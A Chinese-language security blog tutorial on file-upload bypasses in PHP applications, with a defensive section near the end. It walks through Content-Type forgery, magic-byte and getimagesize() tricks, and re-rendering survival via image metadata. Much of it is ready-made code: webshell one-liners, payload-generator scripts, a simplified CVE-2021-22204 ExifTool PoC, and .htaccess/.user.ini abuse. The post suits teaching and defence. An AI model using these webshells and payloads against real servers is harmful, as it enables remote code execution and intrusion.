---
title: 文件上传漏洞：内容类型与MIME绕过
date: 2025-06-15 08:00:00
tags:
  - Web安全
  - 渗透测试
description: 文件上传漏洞——Content-Type 伪造、图片马与二次渲染绕过 getimagesize。
categories: 渗透测试
---

## 概述

文件上传是Web应用中最常见的攻击面之一。开发者常依赖Content-Type头、文件扩展名、魔术字节和`getimagesize()`限制上传类型，但这些机制均可被绕过。本文系统剖析从MIME伪造到二次渲染对抗的完整攻击链，以及ExifTool注入等进阶手法。

**免责声明**：本文技术仅供安全研究与授权测试使用。未经授权对目标系统攻击可能违反法律法规，作者不承担任何误用责任。

---

## 1. 防御机制与绕过难度

| 层级 | 检测机制 | 绕过难度 |
|------|----------|----------|
| L1 | 前端JS校验扩展名 | 无 |
| L2 | Content-Type请求头 | 极低 |
| L3 | 扩展名黑/白名单 | 低-中 |
| L4 | fileinfo魔术字节 | 中 |
| L5 | `getimagesize()` | 中 |
| L6 | GD/ImageMagick二次渲染 | 高 |
| L7 | 内容语义深度解析 | 极高 |

---

## 2. Content-Type头部伪造

`$_FILES['file']['type']`的值来自HTTP multipart请求中客户端声明的`Content-Type`，并非服务端检测结果。后端若仅信任此字段：

```php
if ($_FILES['file']['type'] != 'image/jpeg') { die('仅允许JPEG'); }
move_uploaded_file($_FILES['file']['tmp_name'], '/uploads/' . $_FILES['file']['name']);
```

**curl一行绕过**：
```bash
curl -X POST https://target/upload -F "file=@shell.php;type=image/jpeg"
```
**Python**：
```python
import requests
requests.post(url, files={'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/gif')})
```

**Burp Suite**：抓包将`Content-Type: application/x-php`改为`image/png`。

**防御**：永远不信任客户端MIME；使用`finfo`在服务端独立检测。

---

## 3. 魔术字节（Magic Bytes）绕过

### 3.1 常见文件幻数

| 类型 | Hex | ASCII |
|------|-----|-------|
| GIF89a | `47 49 46 38 39 61` | `GIF89a` |
| GIF87a | `47 49 46 38 37 61` | `GIF87a` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `\x89PNG\r\n\x1a\n` |
| JPEG | `FF D8 FF E0` | — |
| PDF | `25 50 44 46` | `%PDF` |

### 3.2 仅检测fileinfo的场景

当后端用`finfo`验证文件类型但保留用户提供的扩展名时：

```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
if (in_array(finfo_file($finfo, $tmp), ['image/gif','image/png','image/jpeg'])) {
    move_uploaded_file($tmp, './uploads/' . $_FILES['file']['name']); // 扩展名可控
}
```

绕过——在WebShell前拼接合法文件头，`.php`扩展名保留：
```bash
printf 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.gif.php
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.png.php
```

---

## 4. 绕过getimagesize()

`getimagesize()`解析图像结构并返回尺寸数组，返回`false`表示校验失败。GIF的校验极为宽松——只要文件以`GIF89a`或`GIF87a`开头即通过：

```bash
echo 'GIF89a<?php @eval($_POST["x"]);?>' > shell.php
php -r 'var_dump(getimagesize("shell.php"));'  // 返回合法数组，而非false
```

**PNG绕过**：需最小合法结构。最简单方式是在完整PNG尾部追加PHP：

```bash
cp avatar.png evil.png.php
echo '<?php @eval($_POST["x"]);?>' >> evil.png.php
```

`getimagesize()`仅解析PNG头部块，不关心IEND之后的数据。PHP解释器则扫描整个文件寻找`<?php`标签。

**合法图像拼接**：
```bash
convert -size 1x1 xc:white valid.gif
cat valid.gif > bypass.php.gif
echo '<?php system($_GET["cmd"]); ?>' >> bypass.php.gif
```

**注意**：若服务器仅解析`.php`扩展名（Nginx+PHP-FPM默认配置），`.gif`不会直接执行。需配合Apache多后缀（`shell.gif.php`）、Nginx路径截断（`/shell.gif/1.php` + `cgi.fix_pathinfo=1`）或LFI利用。

---

## 5. 二次渲染绕过

### 5.1 原理

部分CMS使用GD/ImageMagick对上传图像重编码，摧毁文件中嵌入的PHP代码：
```php
$img = imagecreatefromjpeg($_FILES['file']['tmp_name']);
imagejpeg($img, $uploadPath, 90);  // PHP代码在此被丢弃
```

**绕过核心思路**：将PHP代码嵌入图像库不会触动的元数据段（注释块、APP段）或像素数据中，而非简单拼接在文件尾部。

### 5.2 GIF — 注释扩展块法

GD库重编码GIF时会保留注释扩展块（`\x21\xFE`）的内容：

```python
def create_gif_webshell(path, cmd='system($_GET["cmd"]);'):
    php = f'<?php {cmd} ?>'.encode()
    comment = b'\x21\xFE' + bytes([len(php)]) + php + b'\x00'
    body = (b'GIF89a\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff' +
            comment + b'\x2C\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4C\x01\x00\x3B')
    with open(path, 'wb') as f:
        f.write(body)
```

二次渲染后，像素数据重写但注释块保全，PHP代码幸存。

### 5.3 JPEG — COM段注入

JPEG压缩改变像素，但许多库保留COM注释段（`FF FE`）和APPn应用段：

```python
def inject_jpeg_com(in_path, out_path, php_code):
    with open(in_path, 'rb') as f:
        data = bytearray(f.read())
    php = b'<?php ' + php_code.encode() + b' __halt_compiler();'
    data[2:2] = b'\xFF\xFE' + len(php).to_bytes(2, 'big') + php
    with open(out_path, 'wb') as f:
        f.write(data)
```

**警告**：GD倾向于丢弃未知段，ImageMagick多数保留——需针对目标环境测试。

### 5.4 PNG — 辅助块注入

在PNG的IEND块前插入自定义辅助块（类型小写字母表示辅助块）：

```python
def inject_png_chunk(in_path, out_path, php_code):
    with open(in_path, 'rb') as f:
        data = bytearray(f.read())
    php = b'<?php ' + php_code.encode() + b' __halt_compiler();'
    pos = data.rfind(b'IEND')
    chunk = len(php).to_bytes(4, 'big') + b'tESt' + php + b'\x00' * 4  # CRC占位
    data[pos - 4:pos - 4] = chunk
    with open(out_path, 'wb') as f:
        f.write(data)
```

---

## 6. ExifTool元数据注入 (CVE-2021-22204)

### 6.1 漏洞概述

ExifTool是Perl编写的元数据工具，被CMS、图床广泛使用。CVE-2021-22204影响7.44–12.23版本：处理畸形DjVu文件时，ANT段的`ImageLength`字段被直接传入Perl `eval()`执行：

```perl
# ExifTool内部处理（简化）
$val = $self->GetValue('ImageLength');
eval $val;   # 危险！
```

### 6.2 PoC构造

```python
"""CVE-2021-22204 — 恶意DjVu生成器"""
import struct
def exploit(path, cmd):
    djvu = b'AT&TFORM\x00\x00\x00\x00DJVM' + b'DJVMDIRM\x00\x00\x00\x00\x00\x01'
    perl = f'(metadata "\\c${{system(\'{cmd}\')}};")'.encode()
    ant  = b'ANTz\x00\x00\x00\x00' + struct.pack('>I', len(perl)) + perl
    with open(path, 'wb') as f:
        f.write(djvu + ant)
```

上传后应用调用ExifTool读取元数据（提取GPS、Exif信息）时触发RCE。

### 6.3 其他注入点与防御

Comment/Artist字段直接嵌入`<?php`可配合LFI利用；XMP元数据为XML格式可触发XXE。防御：升级ExifTool至12.24+，ImageMagick `policy.xml`禁用危险委托，沙箱化图像处理进程。

---

## 7. 图片马实战速查

### 7.1 快速生成

```bash
# GIF马 — 绕过getimagesize最可靠
echo 'GIF89a<?php @eval($_POST["pass"]);?>' > avatar.gif

# 合法GIF + PHP尾
convert -size 1x1 xc:white base.gif
cp base.gif shell.php && echo '<?php @eval($_POST["x"]);?>' >> shell.php

# ExifTool写Comment（配合LFI）
exiftool -Comment='<?php @eval($_POST["pass"]);?>' photo.jpg

# PNG尾部追加
cp photo.png evil.php && echo '<?php @eval($_POST["x"]);?>' >> evil.php
```

### 7.2 上传后解析路径

| 场景 | 文件名/路径 | 解析条件 |
|------|-------------|----------|
| Apache多后缀 | `shell.php.gif` | `AddHandler .php` |
| Nginx截断 | `/uploads/shell.gif/1.php` | `cgi.fix_pathinfo=1` |
| 配合LFI | `?page=uploads/evil.gif` | `include()`用户可控路径 |

### 7.3 配置文件攻击

```apache
# .htaccess — 将.gif映射为PHP处理器
AddType application/x-httpd-php .gif
```

```ini
; .user.ini (PHP-FPM) — 自动包含图片马
auto_prepend_file = /var/www/uploads/shell.gif
```

前提是上传目录允许覆盖配置且Web服务器加载这些文件。

---

## 8. 综合防御

### 8.1 纵深防御核心实现

```php
function secureUpload(array $file): string {
    $map = ['image/jpeg'=>'jpg', 'image/png'=>'png', 'image/gif'=>'gif'];

    // 1. 服务端MIME检测（不信任客户端）
    $mime = (new finfo(FILEINFO_MIME_TYPE))->file($file['tmp_name']);
    if (!isset($map[$mime])) throw new RuntimeException("类型拒绝: $mime");

    // 2. 扩展名白名单
    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if ($ext !== $map[$mime]) throw new RuntimeException('扩展名与MIME不匹配');

    // 3. 图像结构二次确认
    if (!getimagesize($file['tmp_name'])) throw new RuntimeException('非有效图像');

    // 4. 强制二次渲染（核心防线）
    $dest = '/var/www/uploads/' . bin2hex(random_bytes(16)) . '.' . $ext;
    $src = match($mime) {
        'image/jpeg' => imagecreatefromjpeg($file['tmp_name']),
        'image/png'  => imagecreatefrompng($file['tmp_name']),
        'image/gif'  => imagecreatefromstring(file_get_contents($file['tmp_name'])),
    };
    if (!$src) throw new RuntimeException('解码失败');
    $ok = match($mime) {
        'image/jpeg' => imagejpeg($src, $dest, 85),
        'image/png'  => imagepng($src, $dest, 6),
        'image/gif'  => imagegif($src, $dest),
    };
    imagedestroy($src);
    if (!$ok) throw new RuntimeException('写入失败');

    // 5. 输出再确认
    $final = (new finfo(FILEINFO_MIME_TYPE))->file($dest);
    if (!isset($map[$final])) { unlink($dest); throw new RuntimeException('渲染后类型异常'); }
    chmod($dest, 0644);
    return $dest;
}
```

### 8.2 Web服务器隔离

**Apache — 上传目录关闭PHP引擎**：
```apache
<Directory "/var/www/uploads">
    php_flag engine off
    RemoveHandler .php .phtml .php3 .php4 .php5 .php7
</Directory>
```

**Nginx — 禁止执行脚本**：
```nginx
location /uploads/ {
    location ~* \.(php|phtml|php\d)$ { deny all; return 403; }
    add_header Content-Disposition "attachment";
}
```

### 8.3 补充措施

对象存储隔离（S3/OSS/COS签名URL）、随机文件名、ClamAV扫描、ExifTool/ImageMagick保持最新并限制危险委托、审计日志记录SHA256以便溯源。

---

## 9. 绕过手法速查表

| 场景 | 手法 | 关键条件 |
|------|------|----------|
| 黑名单`.php` | `.phtml` `.php5` `.pHp` `.php.` `.php::$DATA` | 大小写差异/解析器差异/NTFS流 |
| 白名单`.jpg` | `shell.jpg.php` | Apache `AddHandler`多后缀 |
| 白名单`.jpg` | `/shell.jpg/1.php` | Nginx `cgi.fix_pathinfo=1` |
| Content-Type | 改为`image/jpeg` | 客户端可控 |
| fileinfo | `GIF89a` + PHP | 仅检测文件头 |
| `getimagesize()` | GIF头拼接 | GIF校验宽松 |
| NULL字节 | `shell.php%00.jpg` | PHP < 5.3.4 |
| 二次渲染 | 注释块/APP段/辅助块 | 格式元数据保留 |
| .htaccess | `AddType application/x-httpd-php .gif` | Apache可覆盖配置 |
| ZIP上传 | ZIP内包含WebShell | 服务端自动解压 |

---

## 10. 总结

文件上传攻防的核心原则是**零信任**：不信任客户端元数据、不依赖单一校验、纵深防御。**强制二次渲染**与**上传目录隔离**是最有效的防线。保持GD/ImageMagick/ExifTool版本更新，关注CVE通告，在条件允许时将用户文件直传对象存储以彻底解除应用服务器风险。

掌握绕过原理是为了构建更坚固的防御。请将这些技术仅用于合法安全研究和授权测试。

---

**参考资料**
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [CVE-2021-22204 — ExifTool DjVu RCE](https://nvd.nist.gov/vuln/detail/CVE-2021-22204)
- [PHP getimagesize() Manual](https://www.php.net/manual/en/function.getimagesize.php)
- [ImageMagick Security Policy](https://imagemagick.org/script/security-policy.php)
- [PortSwigger: File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
